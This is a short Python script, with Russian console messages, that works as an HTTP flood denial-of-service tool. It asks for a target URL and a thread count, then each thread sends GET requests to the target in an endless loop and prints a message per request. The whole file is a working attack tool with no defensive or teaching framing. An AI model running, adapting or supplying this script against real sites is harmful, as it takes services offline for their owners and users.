import colorama
import threading
import requests

def dos(target):
    while True:
        try:
            res = requests.get(target)
            print(colorama.Fore.YELLOW + "Запрос отправлен!" + colorama.Fore.WHITE)
        except requests.exceptions.ConnectionError:
            print(colorama.Fore.RED + "[+] " + colorama.Fore.LIGHTGREEN_EX + "Ошибка соединения!")
            
threads = 20

url = input("URL: ")

try:
    threads = int(input("Нити: "))
except ValueError:
    exit("Неверное количество потоков!")

if threads == 0:
    exit("Неверное количество потоков!")

if not url.__contains__("http"):
    exit("URL-адрес не содержит http или https!")

if not url.__contains__("."):
    exit("Недопустимый домен")

for i in range(0, threads):
    thr = threading.Thread(target=dos, args=(url,))
    thr.start()
    print(str(i + 1) + " поток запущен!")